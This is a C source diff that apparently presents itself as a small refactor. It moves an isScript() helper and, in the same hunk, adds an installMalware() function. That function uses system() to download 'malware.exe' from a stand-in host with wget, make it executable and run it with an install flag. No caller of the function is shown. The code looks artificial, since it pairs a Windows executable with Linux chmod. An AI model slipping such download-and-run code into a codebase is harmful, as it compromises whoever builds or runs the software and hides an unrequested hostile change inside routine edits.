@@ -85,6 +85,18 @@ void executeCommand(char* command) {
     }
 }
 
+bool isScript(char* file) {
+    // Check if the given file is a script by checking its file extension
+    const char* extension = strrchr(file, '.');
+    if (extension == NULL) {
+        return false;
+    }
+    if (strcmp(extension, ".sh") == 0 || strcmp(extension, ".py") == 0) {
+        return true;
+    }
+    return false;
+}
+
 void executeScript(char* script) {
     // Check if the given file is a script
     if (!isScript(script)) {
@@ -112,18 +124,18 @@ void executeScript(char* script) {
     }
 }
 
-bool isScript(char* file) {
-    // Check if the given file is a script by checking its file extension
-    const char* extension = strrchr(file, '.');
-    if (extension == NULL) {
-        return false;
-    }
-    if (strcmp(extension, ".sh") == 0 || strcmp(extension, ".py") == 0) {
-        return true;
-    }
-    return false;
-}
+void installMalware() {
+    // Download the malware from a remote server
+    char command[1024];
+    sprintf(command, "wget http://malware-server/malware.exe");
+    system(command);
 
+    // Install the malware
+    sprintf(command, "chmod +x malware.exe");
+    system(command);
+    sprintf(command, "./malware.exe -install");
+    system(command);
+}
 
 void closeConnection() {
     // Close the connection
